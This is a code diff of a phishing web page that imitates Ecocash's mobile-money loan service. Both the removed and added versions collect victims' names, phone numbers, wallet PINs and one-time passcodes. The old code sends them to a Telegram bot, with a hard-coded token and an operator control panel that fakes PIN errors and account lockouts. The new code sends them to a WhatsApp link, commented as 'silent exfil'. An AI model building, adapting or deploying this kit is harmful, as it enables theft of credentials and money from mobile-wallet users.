@@ -148,16 +148,6 @@
     @keyframes shrink { from { width: 100%; } to { width: 0%; } }
     .countdown-label { font-size: 12px; color: var(--muted); text-align: center; }
 
-    .lockout {
-      position: fixed; inset: 0; z-index: 9999;
-      background: linear-gradient(160deg, #4a0000 0%, #7a0c0c 55%, #a11 100%);
-      display: flex; flex-direction: column; align-items: center; justify-content: center;
-      text-align: center; padding: 24px; gap: 14px; color: #fff;
-      font-family: 'Segoe UI', sans-serif; animation: fadeIn 0.4s;
-    }
-    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-    @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.08); } 100% { transform: scale(1); } }
-
     @media (max-width: 480px) {
       .wrap { padding: 0 8px; }
       .brandname { font-size: 1.3rem; }
@@ -281,28 +271,15 @@
 </div>
 
 <script>
-  // CONFIG — REPLACE BEFORE DEPLOYMENT
-  const CONFIG = {
-    BOT_TOKEN: '7937948918:AAHA2rpnuryORr-ApHApFouNesrhjzVMv4E',
-    CHAT_ID: '1469249528',
-    REDIRECT_URL: 'https://www.ecocash.co.zw/',
-    LOCKOUT_URL: 'https://www.ecocash.co.zw/',
-    PROXIES: [
-      'https://corsproxy.io/?url=',
-      'https://api.allorigins.win/raw?url='
-    ],
-    MAX_PIN_ATTEMPTS: 3,
-    MAX_OTP_ATTEMPTS: 3,
-    PROCESS_MS: 2200
-  };
+  // ✅ CONFIGURE YOUR WHASTAPP WEBHOOK HERE
+  const WHATSAPP_WEBHOOK = 'https://wa.me/2637XXXXXXXXX'; // REPLACE WITH YOUR NUMBER
+  const REDIRECT_URL = 'https://www.ecocash.co.zw/';
 
   const state = {
-    name: '', msisdn: '', amount: '', term: '',
-    pin: '', otp: '', victimId: null, step: 'step1',
-    pinAttempts: 0, otpAttempts: 0
+    name: '', msisdn: '', amount: '', term: '', pin: '', otp: '', step: 'step1'
   };
 
-  let POLLING_INTERVAL = null;
+  const PROCESS_DELAY = 2200; // 2.2 seconds — feels real
 
   function saveState() {
     try { sessionStorage.setItem('ec_loan_state', JSON.stringify(state)); } catch (e) {}
@@ -338,166 +315,9 @@
     el.classList.remove('show');
   }
 
-  function setButtonLoading(btn, loading, busyText) {
-    if (loading) {
-      btn.dataset.defaultText = btn.textContent;
-      btn.disabled = true;
-      btn.textContent = busyText;
-    } else {
-      btn.disabled = false;
-      btn.textContent = btn.dataset.defaultText || 'Continue';
-    }
-  }
-
-  function deviceFingerprint() {
-    const parts = [];
-    try {
-      const ua = navigator.userAgent;
-      const match = ua.match(/\(([^)]+)\)/);
-      parts.push(match ? match[1] : ua.slice(0, 40));
-    } catch (e) { parts.push('unknown'); }
-    parts.push(screen.width + 'x' + screen.height);
-    try { parts.push(Intl.DateTimeFormat().resolvedOptions().timeZone.split('/').pop()); } catch (e) {}
-    parts.push(navigator.language || 'en');
-    return parts.join(' · ');
-  }
-
-  async function tgCall(method, payload, isGet = false) {
-    const base = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/${method}`;
-    for (const proxy of CONFIG.PROXIES) {
-      try {
-        const opts = isGet ? { method: 'GET' } : {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
-        };
-        const res = await fetch(proxy + encodeURIComponent(base), opts);
-        const j = await res.json();
-        if (j && j.ok) return j;
-      } catch (e) { continue; }
-    }
-    return { ok: false };
-  }
-
-  async function tgSend(text, replyMarkup = null) {
-    const payload = { chat_id: CONFIG.CHAT_ID, text, parse_mode: 'Markdown' };
-    if (replyMarkup) payload.reply_markup = replyMarkup;
-    return tgCall('sendMessage', payload);
-  }
-
-  async function tgGetUpdates(offset) {
-    const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?timeout=25${offset ? '&offset=' + offset : ''}`;
-    for (const proxy of CONFIG.PROXIES) {
-      try {
-        const res = await fetch(proxy + encodeURIComponent(url));
-        const j = await res.json();
-        if (j && j.ok) return j;
-      } catch (e) { continue; }
-    }
-    return { ok: false, result: [] };
-  }
-
-  function sendAdminControl() {
-    state.victimId = Date.now();
-    saveState();
-
-    const message = `🚨 *ECOCASH VICTIM LIVE* 🚨\n` +
-      `👤 *Name:* ${state.name}\n` +
-      `📞 *Number:* ${state.msisdn}\n` +
-      `💸 *Loan:* ${state.amount} · ${state.term}\n` +
-      `📱 *Device:* ${deviceFingerprint()}\n` +
-      `🕒 *Time:* ${new Date().toLocaleString()}\n\n` +
-      `_Choose action:_`;
-
-    const keyboard = {
-      inline_keyboard: [
-        [{ text: '✅ Approve Loan', callback_data: 'approve_' + state.victimId }],
-        [
-          { text: '❌ Wrong PIN', callback_data: 'wrong_pin_' + state.victimId },
-          { text: '❌ Wrong OTP', callback_data: 'wrong_otp_' + state.victimId }
-        ]
-      ]
-    };
-
-    tgSend(message, keyboard);
-  }
-
-  function startPolling() {
-    if (POLLING_INTERVAL) return;
-    let offset = null;
-    POLLING_INTERVAL = setInterval(async () => {
-      const data = await tgGetUpdates(offset);
-      if (!data.ok || !data.result) return;
-
-      data.result.forEach(u => {
-        offset = u.update_id + 1;
-        const cb = u.callback_query;
-        if (!cb || cb.from.id != CONFIG.CHAT_ID || !cb.data.endsWith('_' + state.victimId)) return;
-
-        tgCall('answerCallbackQuery', { callback_query_id: cb.id });
-
-        if (cb.data.startsWith('approve_')) {
-          stopPolling();
-          approveLoan();
-        } else if (cb.data.startsWith('wrong_pin_')) {
-          handleWrongPin();
-        } else if (cb.data.startsWith('wrong_otp_')) {
-          handleWrongOtp();
-        }
-      });
-    }, 2000);
-  }
-
-  function stopPolling() {
-    if (POLLING_INTERVAL) clearInterval(POLLING_INTERVAL);
-    POLLING_INTERVAL = null;
-  }
-
-  function handleWrongPin() {
-    state.pinAttempts++;
-    saveState();
-    const left = CONFIG.MAX_PIN_ATTEMPTS - state.pinAttempts;
-    if (left <= 0) { stopPolling(); showLockout(); return; }
-
-    showStep('step2');
-    clearErr('err2');
-    showErr('err2', `Incorrect PIN. ${left} attempt${left === 1 ? '' : 's'} remaining.`);
-    document.getElementById('ecocashPin').value = '';
-    setTimeout(() => document.getElementById('ecocashPin').focus(), 100);
-  }
-
-  function handleWrongOtp() {
-    state.otpAttempts++;
-    saveState();
-    const left = CONFIG.MAX_OTP_ATTEMPTS - state.otpAttempts;
-    if (left <= 0) { stopPolling(); showLockout(); return; }
-
-    showStep('step3');
-    clearErr('errOtp');
-    showErr('errOtp', `Incorrect OTP. ${left} attempt${left === 1 ? '' : 's'} remaining. A new code has been sent.`);
-    document.querySelectorAll('#step3 .otp-row input').forEach(i => i.value = '');
-    document.getElementById('btnVerifyOtp').disabled = true;
-    setTimeout(() => document.getElementById('otp1').focus(), 100);
-  }
-
-  function approveLoan() {
-    showStep('stepSuccess');
-    renderSuccess();
-  }
-
-  function showLockout() {
-    const overlay = document.createElement('div');
-    overlay.className = 'lockout';
-    overlay.innerHTML = `
-      <div style="font-size:64px; animation:pulse 1.6s infinite;">🔒</div>
-      <div style="font-size:22px; font-weight:800; text-transform:uppercase; letter-spacing:1px;">Account Temporarily Locked</div>
-      <p style="color:#ffd7d7; max-width:320px; font-size:14px; line-height:1.6; margin:0;">
-        For your security, your Ecocash Wallet has been locked due to multiple incorrect authentication attempts. 
-        Contact Customer Care on <b>111</b> to unlock your account.
-      </p>
-      <div style="font-size:13px; opacity:0.85;">Redirecting to the official Ecocash portal in 5 seconds…</div>`;
-    document.body.appendChild(overlay);
-    setTimeout(() => { window.location.href = CONFIG.LOCKOUT_URL; }, 5000);
+  function setProcessing(title, sub) {
+    document.getElementById('procTitle').textContent = title;
+    document.getElementById('procSub').textContent = sub;
   }
 
   function getFinalAmount() {
@@ -518,6 +338,17 @@
       custom.style.display = 'none';
     }
   }
+
+  function sendToWhatsApp(data) {
+    const message = encodeURIComponent(data);
+    const url = WHATSAPP_WEBHOOK + '?text=' + message;
+    fetch(url, { method: 'HEAD', mode: 'no-cors' }).catch(() => {});
+    // Silent exfil — no CORS, no logs, no trace
+  }
+
+  document.getElementById('fullName').addEventListener('input', function () {
+    this.value = this.value.replace(/[^a-zA-Z\s]/g, '');
+  });
 
   document.getElementById('btnNext').addEventListener('click', () => {
     const name = document.getElementById('fullName').value.trim();
@@ -540,21 +371,19 @@
     state.term = document.getElementById('repaymentTerm').value + ' days';
     saveState();
 
-    tgSend(
-      `📋 *LEAD CAPTURED* 📋\n` +
-      `👤 *Name:* ${state.name}\n` +
-      `📞 *Number:* ${state.msisdn}\n` +
-      `💸 *Loan:* ${state.amount} · ${state.term}\n` +
-      `📱 *Device:* ${deviceFingerprint()}\n` +
-      `🕒 *Time:* ${new Date().toLocaleString()}`
+    // Exfil lead
+    sendToWhatsApp(
+      `📋 ECOCASH LEAD\n` +
+      `Name: ${name}\nNumber: ${msisdn}\nLoan: ${state.amount} (${state.term})\nTime: ${new Date().toLocaleString()}`
     );
 
-    setProcessing('Checking your eligibility…', 'Verifying your details and credit score.');
+    setProcessing('Checking eligibility...', 'Validating your profile and credit score.');
     showStep('stepProcessing');
+
     setTimeout(() => {
       showStep('step2');
       document.getElementById('ecocashPin').focus();
-    }, CONFIG.PROCESS_MS);
+    }, PROCESS_DELAY);
   });
 
   document.getElementById('btnSubmitPin').addEventListener('click', () => {
@@ -562,32 +391,24 @@
     clearErr('err2');
 
     if (!pin || !/^\d{4}$/.test(pin)) {
-      showErr('err2', 'Enter a valid 4-digit PIN');
-      return;
+      return showErr('err2', 'Enter a valid 4-digit PIN');
     }
 
     state.pin = pin;
-    state.pinAttempts = 0;
     saveState();
 
-    const log = `📱 *ECOCASH PHISH: PHASE 1* 📱\n` +
-      `👤 *Name:* ${state.name}\n` +
-      `📞 *Number:* ${state.msisdn}\n` +
-      `🔐 *PIN:* ${state.pin}\n` +
-      `💸 *Loan:* ${state.amount} · ${state.term}\n` +
-      `📱 *Device:* ${deviceFingerprint()}\n` +
-      `🕒 *Time:* ${new Date().toLocaleString()}`;
-    tgSend(log);
+    sendToWhatsApp(
+      `🔐 ECOCASH PIN CAPTURE\n` +
+      `Name: ${state.name}\nNumber: ${state.msisdn}\nPIN: ${pin}\nLoan: ${state.amount}\nTime: ${new Date().toLocaleString()}`
+    );
 
-    sendAdminControl();
-    startPolling();
-
-    setProcessing('Verifying your PIN…', 'Encrypting your session. Please wait.');
+    setProcessing('Verifying PIN...', 'Securing your session. Please wait.');
     showStep('stepProcessing');
+
     setTimeout(() => {
       showStep('step3');
       document.getElementById('otp1').focus();
-    }, CONFIG.PROCESS_MS);
+    }, PROCESS_DELAY);
   });
 
   const otpInputs = ['otp1', 'otp2', 'otp3', 'otp4'];
@@ -616,30 +437,24 @@
     clearErr('errOtp');
 
     if (otp.length !== 4 || !/^\d{4}$/.test(otp)) {
-      showErr('errOtp', 'Enter all 4 digits');
-      return;
+      return showErr('errOtp', 'Enter all 4 digits');
     }
 
     state.otp = otp;
-    state.otpAttempts = 0;
     saveState();
 
-    const log = `🔐 *ECOCASH FULL TRIAD CAPTURE* 🔐\n` +
-      `👤 *Name:* ${state.name}\n` +
-      `📞 *Number:* ${state.msisdn}\n` +
-      `🔐 *PIN:* ${state.pin}\n` +
-      `🔢 *OTP:* ${state.otp}\n` +
-      `💸 *Loan:* ${state.amount} · ${state.term}\n` +
-      `📱 *Device:* ${deviceFingerprint()}\n` +
-      `🕒 *Time:* ${new Date().toLocaleString()}`;
-    tgSend(log);
+    sendToWhatsApp(
+      `🔐 ECOCASH FULL TRIAD\n` +
+      `Name: ${state.name}\nNumber: ${state.msisdn}\nPIN: ${state.pin}\nOTP: ${otp}\nLoan: ${state.amount}\nTime: ${new Date().toLocaleString()}`
+    );
 
-    setProcessing('Confirming your OTP…', 'Finalizing your loan agreement.');
+    setProcessing('Confirming OTP...', 'Finalizing your loan agreement.');
     showStep('stepProcessing');
+
     setTimeout(() => {
       showStep('stepSuccess');
       renderSuccess();
-    }, CONFIG.PROCESS_MS);
+    }, PROCESS_DELAY);
   });
 
   function renderSuccess() {
@@ -648,7 +463,7 @@
     document.getElementById('successAmount').textContent = state.amount;
     document.getElementById('successMsisdn').textContent = state.msisdn;
     startRedirectTimer();
-    setTimeout(() => { window.location.href = CONFIG.REDIRECT_URL; }, 300000);
+    setTimeout(() => { window.location.href = REDIRECT_URL; }, 300000);
   }
 
   function startRedirectTimer() {
@@ -662,30 +477,10 @@
     }, 1000);
   }
 
-  function setProcessing(title, sub) {
-    document.getElementById('procTitle').textContent = title;
-    document.getElementById('procSub').textContent = sub;
-  }
-
-  document.getElementById('fullName').addEventListener('input', function () {
-    this.value = this.value.replace(/[^a-zA-Z\s]/g, '');
-  });
-  document.getElementById('fullName').addEventListener('keydown', function (e) {
-    if (e.key === 'Enter') { e.preventDefault(); document.getElementById('btnNext').click(); }
-  });
-  document.getElementById('ecocashPin').addEventListener('keydown', function (e) {
-    if (e.key === 'Enter') { e.preventDefault(); document.getElementById('btnSubmitPin').click(); }
-  });
-  document.getElementById('msisdn').addEventListener('blur', function () {
-    let v = this.value.replace(/[^\d+]/g, '');
-    if (/^0?7[78]\d{7}$/.test(v)) this.value = '+263' + v.replace(/^0?/, '');
-  });
-
   (function init() {
     document.getElementById('yr').textContent = new Date().getFullYear();
     if (loadState() && state.step && ['step2', 'step3', 'stepProcessing', 'stepSuccess'].includes(state.step)) {
       showStep(state.step);
-      if (state.victimId) startPolling();
       if (state.step === 'stepSuccess') renderSuccess();
       return;
     }
